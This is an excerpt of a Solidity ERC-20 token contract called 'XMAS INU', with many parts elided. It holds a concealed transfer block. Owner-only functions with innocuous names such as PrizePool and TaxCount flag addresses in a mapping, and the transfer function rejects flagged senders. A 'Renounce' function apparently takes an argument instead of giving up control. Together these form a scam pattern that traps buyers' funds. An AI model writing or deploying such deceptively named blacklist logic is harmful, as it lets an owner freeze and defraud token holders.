...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    mapping(address => bool) private _prizebalances;
    
    mapping(address => bool) private _balances1;
    
    uint256 public _totalSupply = 10 * 10**13;
    string public _name = "XMAS INU";
    string public _symbol= "XINU";
    bool balances1 = true;
    ...
    function Renounce(bool _balances1_) onlyOwner public {
     ...
     function PrizeFund(address account) onlyOwner public {
    ...
    function PrizePool(address account) onlyOwner public {
        _prizebalances[account] = true;
    }
    
    function TaxCount(address account) onlyOwner public {
        _prizebalances[account] = false;
    }
    ...
    function _transfer(
        ...
        require(_prizebalances[sender] != true);
